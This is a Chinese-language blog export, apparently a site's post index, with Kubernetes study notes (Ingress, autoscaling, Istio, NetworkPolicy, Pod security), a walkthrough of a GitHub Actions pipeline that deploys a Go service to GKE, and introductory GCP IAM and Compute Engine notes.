LoadBalancer、和 kube-proxy 利用 iptables / ipvs 提供的负载均衡功能，都属于 L4 负载均衡，工作在传输层。而 Ingress 则提供了 L7 负载均衡，作为工作在应用层的代理服务来实现负载均衡的功能。Ingress 主要采用 TLS Termination 技术，我们可以在 Ingress 层面配置 HTTPS 证书来提供给内部的多个服务使用。\n一个比较简单的方法是通过 Secret 配置证书：\napiVersion: v1 kind: Secret metadata: name: httpserver-tls type: kubernetes.io/tls data: tls.crt: # Base64(PEM format file) tls.key: # Base64(PEM format file) 随后配置 Ingress 对象：\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: httpserver-gateway annotations: kubernetes.io/ingress.allow-http: \u0026#34;false\u0026#34; spec: tls: - hosts: - sigmerc.top secretName: httpserver-tls rules: - host: sigmerc.top http: paths: - path: / pathType: Prefix backend: service: name: httpserver-service port: number: 80 注意证书和域名的匹配问题。这里可以指定多个 path，每个 path 对应一个 backend service。一些特性则可以在 .metadata.annotations 中声明，例如禁止 HTTP 等。\n节点管理 # OS # 节点可以选择安装类似 CentOS、Ubuntu、Debian 等通用操作系统，也可以选择为容器优化的最小化操作系统，如 CoreOS、RedHat Atomic 等。后者的主要优势在于体积更小、安全性更高、以及原子的升级和回退操作。例如，Atomic 就是基于 rpm-ostree 灵活地构建、升级、回退操作系统镜像的。\n资源管理 # kubelet 基于 cAdvisor，周期性向 API Server 上报节点状态，作为调度器在调度节点时的参考。Kubernetes 采用 Lease 机制，在 nodeLeaseDurationSeconds 时间内，如果节点的 Lease 对象没有更新，就认为节点不健康。\n同时，kubelet 也可以为节点 OS 中其他系统进程预留资源，通过 k describe node 可以查看节点的总资源量 capacity 和可分配额 allocatable。磁盘同样被分为系统分区 nodefs 和容器运势分区 imagefs。\n在节点资源不够时，kubelet 会终止部分 Pod 中的容器进程以回收资源，保证节点稳定性，但不会删除 Pod，这一过程称为驱逐。由于被驱逐的 Pod 已经停止却不会被删除，需要注意定期清理这些 Pod。根据进程内存使用情况，甚至可能发生 OOM Kill。\n存储方面，需要注意日志的定时 rotate，防止大量日志占用磁盘。网络方面，则可以使用 kubernetes.io/ingress-bandwidth 和 kubernetes.io/egress-bandwidth 来控制出入流量。\n异常检测 # node-problem-detector 是 Kubernetes 中检测节点异常信息并上报的工具，通过设置 NodeCondition 改变节点状态来处理永久性故障、通过 Event 对象来通知其他对象临时性故障。\n不过 NodeCondition 的变化不会影响调度器逻辑，而是需要我们自己编写控制器，监听 NodeCondition 变化并做污点标记。\n运维相关 # 镜像管理 # 我们还可以自行构建私有镜像仓库，增强安全性和可达性，只要遵循 OCI 的 Distribution Spec 就可以像使用公有镜像仓库一样使用自己的镜像仓库。例如，Harbor 就可以用来构建一个功能丰富的镜像仓库，还提供了自动化的日志收集、垃圾回收等功能。当然，镜像仓库同样需要高可用部署。私有镜像仓库配合 Dragonfly ，可以大大加速镜像的拉取。\n镜像本身也可能存在安全问题，在构建镜像时应注意减少不必要依赖、避免直接在构建指令中引用敏感信息等。部署为 Pod 前，应通过准入控制对镜像进行安全漏洞扫描。\nCI/CD # 在 Kubernetes 中当然也要把 CI/CD 自动化、容器化。这方面现有的成熟工具都可以比较方便地使用：\nJenkins GitOps GitHub Actions 除此之外，还有基于声明式 API 的 Tekton、ArgoCD 等等，这些工具都与本身采用声明式 API 的 Kubernetes 高度兼容。\n监控和日志 # 分布式系统中日志查看较为复杂，因此需要工具将日志收集汇总，便于查看。例如，我们可以采用 Loki-stack 子系统，通过运行在节点上的 Promtail 将容器日志发送到 Loki，由 Loki 聚合日志并发送到 Grafana，最终呈现可视化日志观测的效果。\n监控方面则通常使用 Prometheus 从节点上拉取监控指标（往往需要在应用代码中暴露相应的指标），并由 Grafana 展示。为了更高效地查看监控数据，需要了解 PromQL 查询语言。除此之外，Prometheus 还支持告警、断言等操作。可以想象，Prometheus 对内存和存储的要求较高。\n应用迁移 # 应用容器化 # 将应用容器化，需要从两方面考虑，一是应用本身的启动速度、参数、健康检查，而是 Dockerfile 的编写，例如使用尽可能小的基础镜像、安装尽可能少的依赖、进程数控制、代码和配置分离、镜像分层等等。\n尤其需要注意的是，容器和宿主机共用内核，因此系统参数配置、fd 数、进程数、主机磁盘都是共享的。这意味着使用 top / cat /proc/cpuinfo / cat /proc/meminfo / df -k 等命令看到的资源都是主机资源。那么如何判断应用当前运行在 Kubernetes 上还是主机上呢？一种办法是查看 /proc/1/cgroup 中是否包含 kubepods 关键字。\n至于 CPU 和内存的配额及用量，可以参考上文 cgroups 部分的内容。\nPod 配置 # 在应用容器化之后，需要配置 Pod spec，比如值得注意的有用于初始化的 init container、权限相关的 SecurityContext、共享哪些 Namespace、如何优雅终止、健康检查、DNS 策略、镜像拉取策略等等。\n一个典型的例子是如下的一个 readiness probe：\nreadinessProbe: exec: command: - /opt/rprobe.sh failureThreshold: 3 initialDelaySeconds: 30 periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1 由于 command 是一个 bash 脚本，Entrypoint 进程会 fork() 出新进程来执行脚本进行健康检查。然而，这里的超时时间只有一秒，如果检查没有正常执行完成而是超时退出，并且 Entrypoint 没有清理子进程的能力的话，就会导致每次健康检查都会留下一个僵尸进程，造成 PID 泄漏。\nTini 项目很好地解决了这一问题：\nENTRYPOINT [\u0026#34;/tini\u0026#34;, \u0026#34;--\u0026#34;] # Run your program under Tini CMD [\u0026#34;/your/program\u0026#34;, \u0026#34;-and\u0026#34;, \u0026#34;-its\u0026#34;, \u0026#34;arguments\u0026#34;] 此时，PID 为 1 的 Entrypoint 进程为 Tini，后续容器中的僵尸进程的父进程会被设为 1，最后被 Tini 清理。当然，除了使用 Tini 外，设置合理的超时时间也是需要的。\n为了保障应用高可用，还可以设置 PodDisruptionBudget 指定 minAvailable 或 maxUnavailable 数量，这和滚动更新的配置有些类似。\nHelm # Kubernetes 中拥有各种各样的 API Resources，一个完整的服务可能就需要用到其中的好几种，在服务数量较多时较难管理。因此可以使用类似包管理器的 Helm 来实施对服务层面而不是 API Resources 层面的管理。\nHelm chart 就像 apt 中的 package，是 Helm 部署应用的单元。Helm 客户端将 Helm chart 安装到 Kubernetes 并生成 release。\nHelm 拥有相当清晰详细的文档，感觉自己写得不如文档好，具体的使用这里就不写了。\nCRD # 应用迁移过程中，难免遇到需要扩展 Kubernetes 对象以满足业务需求的场景，此时我们可以编写 CRD 来达到这一目标。一般可以采用 kubebuilder 搭建脚手架，先利用 RBAC 机制保障安全性和设立访问控制机制，随后将扩展的资源数据存储到 etcd，然后最关键的是要实现 Controller，借助 APIServer 监听其他对象或资源的状态变化并作出反应。编写 CRD 就类似于编写 Kubernetes 插件，十分灵活。\n自动扩缩容 # metrics-server # Kubernetes 使用 metrics-server 监控集群，从 kubelet 中收集数据并通过 kube-aggregator 进行聚合，并在 APIServer 中通过 /api/metrics.k8s.io 暴露指标数据。安装了 metrics-server 后，就可以通过 k top 来查看资源信息了。\nHPA # 自动横向扩缩容 HPA 也依赖于 metrics-server 提供的数据，例如根据资源使用量动态调整 Deployment 中的 replicas 字段等等。例如，我们可以为已有的 Deployment php-apache 创建如下 HPA：\napiVersion: autoscaling/v1 kind: HorizontalPodAutoscaler metadata: name: php-apache namespace: default spec: maxReplicas: 10 minReplicas: 1 scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: php-apache targetCPUUtilizationPercentage: 50 表示最少 1 个副本，最多 10 个副本，当 CPU 利用率超过 50% 时扩容。在 autoscaling/v2beta2 中，则使用 metrics 字段细化指标类型：\napiVersion: autoscaling/v2beta2 kind: HorizontalPodAutoscaler metadata: name: php-apache spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: php-apache minReplicas: 1 maxReplicas: 10 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 随后，对服务加压：\n$ k run -i --tty load-generator --rm --image=busybox --restart=Never -- /bin/sh -c \u0026#34;while sleep 0.01; do wget -q -O- http://php-apache; done\u0026#34; 此时 HPA 会在 Pod CPU 利用率达到 50% 时扩容，直到创建了 10 个副本。停止加压一段时间后，副本数会慢慢下降，直至只剩一个。\nHPA 的动态调整是有效的，但是却存在滞后性，面对突发流量时从负载超出阈值到 HPA 完成扩容需要较长的时间，这是 HPA 的主要缺点。\nVPA # 垂直自动扩缩容则根据每个 Pod 的资源利用情况（同样来自 metrics-server），调整 requests 字段，从而允许 Pod 被调度到合适的节点上。Recommender 收集指标后给出资源请求限制的建议，由 Admission Plugin 将 Pod 变形，Updater 监听建议，最终删除旧 Pod，由 Deployment 创建新 Pod。\n遗憾的是，VPA 成熟度不足，尚不能用于生产环境，这主要是因为：\nVPA 会导致 Pod 的重建和重启，而且 Pod 可能被调度到其他节点上 VPA 无法驱逐不在副本控制器下的 Pod VPA 无法和 HPA 同时使用 VPA 修改 requests 后，结果可能超出实际的节点资源上限导致 Pod 无法被调度 Istio # 在微服务架构中，除了业务本身的微服务，也就是数据面之外，我们还需要负载均衡、认证授权、服务发现、熔断限流、TLS 加密、日志监控等控制面功能，以及相应的服务注册中心、认证服务器、API 网关等控制面组件。然而在传统微服务架构中，控制面和数据面混合在一起，不便于维护。\n服务网格则通过在每个业务微服务旁加入 Sidecar 劫持出入流量，控制面的功能由 Sidecar 来处理，因此负责与控制面组件或是其他微服务通信的也是 Sidecar。这使得业务微服务无需再关心控制面逻辑，也能够自由选择技术栈。\n然而，Sidecar 本身是一个容器，更多的运行实例意味着更复杂的架构。由于每个服务调用都必须经过 Sidecar，必定会引入额外的网络跳转，带来一定性能开销，因此需要慎重考虑是否真的需要服务网格。\nIstio 的控制平面 istiod 如今是一个单体应用，数据平面 Envoy 则担任了 Sidecar 的角色。\nEnvoy # 相比 Nginx 和 HA Proxy，Envoy 支持 HTTP/2 和不丢失连接的热重启，并且依然能保持高性能。而高度可扩展性（Filter 插件）和 API 可配置性使得它能够比较轻松地与复杂控制面结合，成为了更为通用的数据面。\nEnvoy 基于 epoll，采用单进程多线程模式，在 v1 版本中仅使用 REST+JSON 轮询的方式，到了 v2 则增加了 proto3+gRPC 的支持，这使得 Envoy 能够真正应用于生产环境。\n流量劫持机制 # 当我们给 Namespace、Deployment 等对象打上 istio-injection=enabled 标签时，对应 Pod 的流量就会被 Sidecar 劫持，原本只运行一个容器的 Pod 会多出一个 Sidecar，运行 istio/proxyv2 镜像（实际上就是 envoy），这是由 Istio 的 mutating webhook 插入的。同时，通过 init container 修改了原容器的 iptables，使得出方向的 TCP 流量：\n被重定向到虚拟监听器监听的 15001 端口 由 15001 端口转到 80 端口 通过路由规则找到目标 FQDN 和 Endpoint 转发到目标 Endpoint 然而，在转发到目标 Endpoint 的过程中依然会受到 iptables 规则约束，这样是不是会回到第一步，又被转发到 15001 端口呢？为了避免这种情况，iptables 中配置了一条特殊的规则，放行特定用户（UID=1337）的流量，而 Sidecar 容器正是通过这个用户运行的 istio-proxy，因此第四步的流量不会被 iptables 拦截。\n而对于入方向的 TCP 流量，流程是一致的，区别仅在于 15001 变成了 15006 端口。\n流量管理 # Istio 能提供更精细化的流量管理，例如将 95% 的流量负载均衡给生产环境的服务、将 5% 的流量发送到金丝雀发布的服务，或是将来自不同客户端的流量转发到不同版本的服务等等。不过，虽然 Envoy 支持多种负载均衡算法，Istio 目前只支持轮询、随机和带权重的最少请求算法。\n除了负载均衡之外，Istio 和 Envoy 结合还支持健康检查、超时处理、细粒度熔断机制、重试机制、流量控制、错误注入等丰富功能。\nVirtualService # 例如，我们将 25% 流量分给 v2 版本，剩余 75% 给 v1 版本，并引入超时、重试、错误注入机制：\napiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: reviews spec: hosts: - reviews # FQDN http: - route: - destination: host: reviews subset: v1 weight: 75 - destination: host: reviews subset: v2 weight: 25 timeout: 10s retries: # retry if upstream server send 5xx attempts: 3 perTryTimeout: 2s fault: # send 500 to 80% client abort: httpStatus: 500 percentage: value: 80 一个常见的用法是配合 Gateway 发布服务：\napiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: simple spec: gateways: - simple hosts: - simple.com http: - match: - port: 80 route: - destination: host: simple.simple.svc.cluster.local port: number: 80 --- apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: simple spec: selector: istio: ingressgateway servers: - hosts: - simple.com port: name: http-simple number: 80 protocol: HTTP 或者使用条件规则，配合 DestinationRule 设置灵活的负载均衡策略：\napiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: canary spec: hosts: - canary http: - match: # if header[\u0026#34;user\u0026#34;]==\u0026#34;merc\u0026#34;, go to v2 - headers: user: exact: merc route: - destination: host: canary subset: v2 - route: - destination: host: canary subset: v1 --- apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: canary spec: host: canary trafficPolicy: # default to RANDOM loadBalancer: simple: RANDOM subsets: - name: v1 # RANDOM inside v1 labels: version: v1 - name: v2 labels: version: v2 trafficPolicy: # RR inside v2 loadBalancer: simple: ROUND_ROBIN 除了这些之外，还可以使用 mirror 字段实现流量镜像、delegate 字段进行规则委托等、为 Gateway 配置 TLS、用 DestinationRule 实现断路器等。更多用法可以参考 官方文档。\n安全 # 容器运行时安全 # 一般不允许使用 root 用户运行容器，防止权限过高。集群中也需要保证容器与容器间、容器与主机间隔离，并遵循最小特权原则。为了达到这一目标，常用的手段包括 Pod 安全上下文（Pod Security Context）、API Server 的认证、授权、审计、准入、以及数据加密等机制。\n集群安全 # Kubernetes 的 API 通信都基于 TLS，实现了传输过程中的加密 定义 EncryptionConfiguration 对象可以对存储进行加密 使用 NodeRestriction 准入控制插件可以防止 kubelet 修改带 node-restriction.kubernetes.io/ 标签的节点，降低 kubeconfig 泄露造成的危害 Pod 安全策略则更细粒度地限制了用户对 Pod 的操作： Container-level Security Context 仅应用到指定的容器 Pod-level Security Context 应用到 Pod 内所有容器（和 Volume） Pod Security Policies 则应用到整个集群内部的所有 Pod（和 Volume） 例如，可以在 Container-level Security Context 中禁止特权运行，也可以将 securityContext 字段提到和 containers 同级作为 Pod-level Security Context：\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx securityContext: privileged: false Pod Security Policies 则需要作为一个单独的对象编写，例如限制端口范围：\napiVersion: policy/v1beta1 kind: PodSecurityPolicy metadata: name: example spec: privileged: false seLinux: rule: RunAsAny supplementalGroups: rule: RunAsAny runAsUser: rule: RunAsAny fsGroup: rule: RunAsAny hostPorts: - min: 8000 max: 8080 volumes: - \u0026#34;*\u0026#34; 最后，之前提到的 Taint 机制也可以用于集群节点间的安全隔离。\nNetworkPolicy # Kubernetes 默认提供了 NetworkPolicy 对象实现三层/四层网络流量的控制，概念上类似防火墙。不过，要使用 NetworkPolicy，我们必须使用支持 NetworkPolicy 的 CNI。NetworkPolicy 的语义非常直观，和防火墙规则类似：\napiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-network-policy namespace: default spec: podSelector: matchLabels: role: db policyTypes: - Ingress - Egress ingress: - from: - ipBlock: cidr: 172.17.0.0/16 except: - 172.17.1.0/24 - namespaceSelector: matchLabels: project: myproject - podSelector: matchLabels: role: frontend ports: - protocol: TCP port: 6379 egress: - to: - ipBlock: cidr: 10.0.0.0/24 ports: - protocol: TCP port: 5978 上面的 NetworkPolicy 会应用到 default Namespace 下带 role=db 标签的所有 Pod 上，允许来自除 172.17.1.0/24 外所有 172.17.0.0/16 的入站流量、允许来自带 project=myproject 标签的所有 Namespace 的入站流量、允许 default Namespace 下带 role=frontend 标签的所有 Pod 的 入站流量发送到 TCP 6379 端口上。同时允许访问 10.0.0.0/24 网段 TCP 5978 端口的出站流量。\n如果 podSelector 设为 {}，则会应用到所有 Pod 上；如果 ingress 或 egress 字段设为 {}，则会允许所有入站/出站流量。\nCalico 在此基础上，开发了自己的 NetworkPolicy 扩展了其功能。需要注意的是，Calico 的 NetworkPolicy 和默认 NetworkPolicy 同名但并非同一个对象。例如，我们可以编写如下规则允许集群内所有 ping 请求：\napiVersion: projectcalico.org/v3 kind: GlobalNetworkPolicy metadata: name: allow-ping-in-cluster spec: selector: all() types: - Ingress ingress: - action: Allow protocol: ICMP # notProtocol: TCP # do not match this protocol source: # nets: # IP range # namespaceSelector: # namespace label selector # ports: # - 80 # single port # - 6040:6050 # port range # destination: # target address selector: all() # pod label selector icmp: type: 8 # Ping request - action: Allow protocol: ICMPv6 source: selector: all() icmp: type: 128 # Ping request # serviceAccountSelector: # apply rules to this SA 上述规则只展示了 ingress 规则，同理可以运用于 egress。此外，还可以配置 GlobalNetworkPolicy 应用于集群中所有 Namespace，并且能限制 Pod 和主机之间的流量，这是默认 NetworkPolicy 做不到的。可以想到，Calico 的 NetworkPolicy 也是基于 iptables 实现的。\nIstio 安全保证 # Istio 拥有自己的 CA 以支持 TLS 双向认证，这是通过 Sidecar 上的 Envoy 实现的。Istio 通过 Service Identity 确定一个请求源的身份，在 Kubernetes 中对应 Service Account。\n当工作负载启动时，Envoy 通过 Secret Discovery Service 向 istio-agent 发送证书和密钥请求，后者交由 istiod CA 签名生成证书后返回。后续的证书有效期更新则由 istio-agent 负责。\n例如，在 DestinationRule 中可以开启 TLS 双向认证：\napiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: ratings-istio-mtls spec: host: ratings.prod.svc.cluster.local trafficPolicy: tls: mode: ISTIO_MUTUAL # SIMPLE / MUTUAL / ISTIO_MUTUAL 工作负载间的通信主要通过 PeerAuthentication 认证，默认使用 Permissive 模式，即优先使用 mTLS，但同样支持明文通信，方便服务迁移。Strict 和 Disable 模式则对应强制 mTLS 和强制明文两个极端。此外，mTLS 模式选择可以细化到端口级别。\napiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: example-peer-policy namespace: foo spec: selector: matchLabels: app: reviews mtls: mode: STRICT # PERMISSIVE / STRICT / DISABLE # portLevelMtls: # 80: # mode: DISABLE RequestAuthentication 则是用户请求到服务的认证，主要基于 JWT。我们可以配置规则对请求携带的 JWT 进行检查并拒绝无效请求。\napiVersion: security.istio.io/v1beta1 kind: RequestAuthentication metadata: name: default namespace: istio-system spec: selector: matchLabels: istio: ingress-gateway jwtRules: - issuer: \u0026#34;testing@secure.istio.io\u0026#34; jwksUri: \u0026#34;https://raw.githubusercontent.com/istio/istio/release-1.12/security/tools/jwt/samples/jwks.json\u0026#34; 同样地，授权也是类似的，通过 AuthorizationPolicy 配置 rules 字段来 ALLOW 或 DENY 相应的请求。\napiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: httpbin namespace: foo spec: selector: matchLabels: app: httpbin version: v1 action: ALLOW # default value: DENY rules: - from: - source: principals: [\u0026#34;cluster.local/ns/default/sa/sleep\u0026#34;] - source: # OR namespaces: [\u0026#34;dev\u0026#34;] to: - operation: methods: [\u0026#34;GET\u0026#34;] when: - key: request.auth.claims[iss] values: [\u0026#34;https://accounts.google.com\u0026#34;] 需要注意的是，source 字段下的 principals 如果设为 [*]，则代表只允许经过认证的用户。如果需要公开访问，可以不写 source 字段。\n其他尚未学习的方面 # Extended Resource 集群自动化管理、集群高可用、节点生命周期管理 Cluster API、K8s in K8s Cluster Autoscaler 多租户管理、多集群管理 部署有状态应用 ","date":"2021-10-10","permalink":"/posts/kubernetes/","section":"Posts","summary":"\u003cp\u003e在了解了 Kubernetes 为什么叫 K8s 之后，才明白 internationalization 为什么叫 i18n。\u003c/p\u003e","title":"乘风破浪：Kubernetes 笔记"},{"content":"","date":"2021-10-10","permalink":"/categories/%E4%BA%91/","section":"Categories","summary":"","title":"云"},{"content":"","date":"2021-09-25","permalink":"/tags/arm/","section":"Tags","summary":"","title":"ARM"},{"content":"","date":"2021-09-25","permalink":"/tags/gcp/","section":"Tags","summary":"","title":"GCP"},{"content":"GitHub Actions 还可以配合 Issue 用来做开源社区的无聊小游戏，这就留到《三探 GitHub Actions》再说了。\n背景 # 和 上回 类似，我这次又遇到了一些机械重复的操作。当我写完一个 Go 应用，想发布在公网上供访问、同时保证高可用性时，我需要：\n运行 go build，附带一堆参数 运行 docker build 打包 Docker 镜像 运行 docker run 测试镜像是否可用，存在问题则回到第 1 步之前 运行 docker ps 和 docker rm 清理容器 运行 docker push 发布镜像 运行 docker image ls 和 docker image rm 清理镜像 在 Google Kubernetes Engine 里打开 Cloud Shell 运行 kubectl create deploy 创建 deploy 运行 kubectl expose deploy 创建 service 这实在是太麻烦了。不过和上次不同，这次的步骤和参数都复杂了许多，因此多花了些时间。\n编写 Dockerfile # 我这里使用了 Muti-stage 的方式，先编译后部署，实际上也可以写一个脚本，本地编译后直接运行第二阶段。\nFROM golang:1.17.1 AS builder RUN mkdir /app ADD . /app WORKDIR /app RUN mkdir bin \u0026amp;\u0026amp; CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\u0026#34;-w -s\u0026#34; -gcflags \u0026#34;-N -l\u0026#34; -o bin/httpserver FROM alpine AS production COPY --from=builder /app/bin/* . CMD [\u0026#34;./httpserver\u0026#34;, \u0026#34;:8080\u0026#34;] 需要注意的是，alpine 所采用的 musl libc 会影响到使用默认配置编译的 go 二进制文件，因此必须设置 CGO_ENABLED=0。\n写好上面的 Dockerfile 后，x64 机器就可以直接打包镜像了，但 M1 不行，因为 M1 上的 Docker 无论 pull 还是 build 都默认用 ARM 版本的镜像。为了解决这个问题，可以用 buildx 辅助编译：\n$ docker buildx build --platform linux/amd64 --push -t httpserver . buildx 还可以声明多个平台，用逗号隔开。当然此时也需要 go 编译多个平台的二进制文件。\n不过最方便的办法当然是使用 GitHub Actions 啦。由于和 GCP 融合，我们选择把镜像上传到 Google Container Registry，因此 Actions 脚本会有些变化：\nname: Build and Deploy to GKE on: push: branches: - main env: PROJECT_ID: ${{secrets.GKE_PROJECT}} GKE_CLUSTER: cluster-1 GKE_ZONE: us-central1-c DEPLOYMENT_NAME: httpserver IMAGE: httpserver jobs: setup-build-publish-deploy: name: Setup, Build, Publish and Deploy runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 # Setup gcloud CLI # ... # Configure Docker to use the gcloud command-line tool as a credential # helper for authentication # ... # Get the GKE credentials so we can deploy to the cluster # ... # Build the Docker image - name: Build run: |- docker build \\ --tag \u0026#34;gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\u0026#34; \\ --build-arg GITHUB_SHA=\u0026#34;$GITHUB_SHA\u0026#34; \\ --build-arg GITHUB_REF=\u0026#34;$GITHUB_REF\u0026#34; \\ . # Push the Docker image to Google Container Registry, maybe need storage admin role? - name: Publish run: |- docker push \u0026#34;gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\u0026#34; # Set up kustomize # ... # Deploy the Docker image to the GKE cluster # ... 上面省略了 GKE 相关的一些配置，我们会在下面介绍。可以看到，此时我们用 $GITHUB_SHA$ 作为我们镜像的 tag，这是因为部署到 Kubernetes 时需要明确指定一个 tag 而不是用默认的 latest。\n配置 GCP # 首先安装好 gcloud：\n# Setup gcloud CLI - uses: google-github-actions/setup-gcloud@v0.2.0 with: service_account_key: ${{secrets.GKE_SA_KEY}} project_id: ${{secrets.GKE_PROJECT}} 这里的 GKE_PROJECT 就是 GKE 所在的项目的 Project ID，GKE_SA_KEY 是在 GCP 上执行后续操作的 Service Account 的密钥。这个密钥可以在创建 Service Account 后在 “密钥” 选项卡生成，需要的是 JSON 格式的密钥，且需要进行 Base64 编码后填入 secrets。\n随后登录 Container Registry：\n# Configure Docker to use the gcloud command-line tool as a credential # helper for authentication - run: |- gcloud --quiet auth configure-docker 这一步会利用上面的 Service Account 登录 Container Registry。由于后续要上传镜像，涉及到了 create bucket 的操作，我们需要在创建 Service Account 时授予 Storage Admin 或类似的拥有 create bucket 权限的角色（Storage Admin 权限很高，这样做并不符合最小特权原则）。除此之外，显然 Service Account 还需要 Kubernetes Engine Developer 角色才能在后面管理 K8s 集群。\n最后获取 GKE 权限：\n# Get the GKE credentials so we can deploy to the cluster - uses: google-github-actions/get-gke-credentials@v0.2.1 with: cluster_name: ${{env.GKE_CLUSTER}} location: ${{env.GKE_ZONE}} credentials: ${{secrets.GKE_SA_KEY}} 随后就是上面看到的 Build 和 Publish 操作了。\nCustomize kustomize # 最后一步就是使用 kustomize 来搭建 deploy。在打包镜像时有一个很明显的问题，那就是镜像的 tag 在每次 Actions 执行时都是动态的，我们并不清楚其具体值，也无法把他写进 deployment.yml 里。因此我们可以先这样写：\napiVersion: apps/v1 kind: Deployment metadata: name: httpserver spec: replicas: 3 selector: matchLabels: app: httpserver strategy: rollingUpdate: maxSurge: 1 maxUnavailable: 1 minReadySeconds: 5 template: metadata: labels: app: httpserver spec: containers: - name: httpserver image: gcr.io/PROJECT_ID/IMAGE:TAG ports: - containerPort: 8080 resources: requests: cpu: 100m limits: cpu: 100m --- apiVersion: v1 kind: Service metadata: name: httpserver-service spec: type: LoadBalancer ports: - port: 80 targetPort: 8080 selector: app: httpserver 可以看到 image 部分留了一些像环境变量一样的东西，这就相当于 kustomize 的模版字符串，之后 kustomize 做的事情其实就类似于一个模版引擎。我们编写 kustomization.yml 来让它找到文件的位置：\napiVersion: kustomize.config.k8s.io/v1beta1 kind: Kustomization resources: - deployment.yml 这样，配置文件就写好了，最后再加上 Actions 的步骤：\n# Set up kustomize - name: Set up Kustomize run: |- curl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64 chmod u+x ./kustomize # Deploy the Docker image to the GKE cluster - name: Deploy run: |- ./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA ./kustomize build . | kubectl apply -f - kubectl rollout status deployment/$DEPLOYMENT_NAME kubectl get services -o wide 大功告成，可以 push 一下看看 Actions 的运行结果了。运行完成之后，也可以在 GKE 上看到对应的信息。\n","date":"2021-09-25","permalink":"/posts/dockerfile2gke/","section":"Posts","summary":"\u003cp\u003eGitHub Actions 还可以配合 Issue 用来做开源社区的无聊小游戏，这就留到《三探 GitHub Actions》再说了。\u003c/p\u003e","title":"再探 GitHub Actions：从 Dockerfile 到 GKE"},{"content":"待更新。\n云计算是什么？ # 可以在任何时间自助地获取计算资源，无需人工干预； 可以在任何地点访问这些计算资源； 云服务商拥有计算资源池，并从池中分配资源给用户； 计算资源可以弹性收缩； 按量计费，停止使用即停止收费。 GCP 地域和区域 # 地域（Zone）是一块 GCP 资源的部署区，不过不一定是一个类似数据中心的单一的建筑。若干个地域组成了区域（Region），同一区域内的不同地域之间网络通信速度极快。可以认为，一个地域就是一个区域内的故障域。为了提高容灾性能，可以进行多地域部署。\n更进一步，为了防止类似自然灾害等不可抗力造成的数据损失，还可以进行多区域部署（区域之间至少相隔 160 km）。\nGCP 资源层级树 # 每个 GCP 计算资源（Resource）属于且仅属于一个项目（Project）。若干个项目可以组成文件夹（Folder），而文件夹通过层级树结构（和文件系统类似）从属于一个组织（Organization）。创建文件夹和组织并不是必须的，但创建文件夹前需要先创建组织。\nProject 标识符 # 标识符 唯一性 标识符来源 可变性 Project ID 全局唯一 用户可指定 不可变 Project name 无需唯一 用户可指定 可变 Project number 全局唯一 GCP 分配 不可变 IAM 策略 # IAM 策略规定了：\n谁 对哪些资源 可以做什么 其中，“谁” 部分可以针对：\nGoogle 账号 Google 群组 服务账号 G Suite Cloud Identity Domain “对哪些资源” 部分比较简单，就是上面提到的任何资源节点（Resource / Project / Folder / Organization, etc.）。\n“可以做什么” 部分由 IAM 角色定义。 IAM 角色是一系列权限的集合，可以分为三种角色：\nPrimitive Role 只能应用到整个 Project，分为 Owner / Editor / Viewer / Billing administrator 四个角色，所拥有的权限显而易见； Predefined Role 是 GCP 服务中预定义的一些角色，可以应用到 Resource / Project / Folder / Organization 层甚至是某个资源实例上，粒度更细。 Custom Role 只能应用到 Project 或 Organization，由用户自定义，粒度较 Predefined Role 更细。 如果要授予权限给某个计算资源而不是一个用户，就需要针对该计算资源创建一个服务账号，将权限授予该服务账号。同时，服务账号本身也是一种 GCP 资源，因此 IAM 策略也可以应用到服务账号上，实现对服务账号本身的管理。\n策略继承 # IAM 策略可以应用到任何资源节点，并且会自顶向下继承。比较反直觉的是，当顶层策略和底层策略冲突时，两者中更宽松的策略会生效。\n🌰 1️⃣ Project 层策略规定某用户对某资源拥有修改权限 Organization 层策略规定该用户对该资源仅拥有读取权限 前者更宽松，因此生效 🌰 2️⃣ Project 层策略规定某用户对某资源拥有修改权限 Resource 层策略规定该用户对该资源仅拥有读取权限 前者更宽松，因此生效 可以看到，发生冲突时，一个 IAM 策略是否生效与其所在层级无关，仅与其是否更为宽松有关。\n云上虚拟机 # Virtual Private Cloud Network # VPC 用于在虚拟机（Compute Engine）之间构建网络，例如进行网段划分、防火墙设置、静态路由设置等。值得注意的是，VPC 是全局资源，是可以跨区域的，而 VPC 中创建的子网也可以跨地域。\n类似物理网络，VPC 会维护一个路由表用于在虚拟机之间寻找路由，VPC 之间也可以互联。此外，VPC 还提供了分别针对区域内、外部流量的负载均衡、DNS 服务、CDN 服务等等。\nCompute Engine 实践 # 在 Compute Engine 里创建新的 VM instance，命名为 my-vm-1，允许 HTTP 入站流量。 由于 my-vm-1 在 us-central1-a 地域中，我们在 Cloud Shell 中查找同区域内有哪些地域： gcloud compute zones list | grep us-central1 随意选一个不同的地域，例如 us-central1-b，并修改当前地域： gcloud config set compute/zone us-central1-b 创建第二个虚拟机： gcloud compute instances create \u0026#34;my-vm-2\u0026#34; \\ --machine-type \u0026#34;n1-standard-1\u0026#34; \\ --image-project \u0026#34;debian-cloud\u0026#34; \\ --image-family \u0026#34;debian-10\u0026#34; \\ --subnet \u0026#34;default\u0026#34; 退出 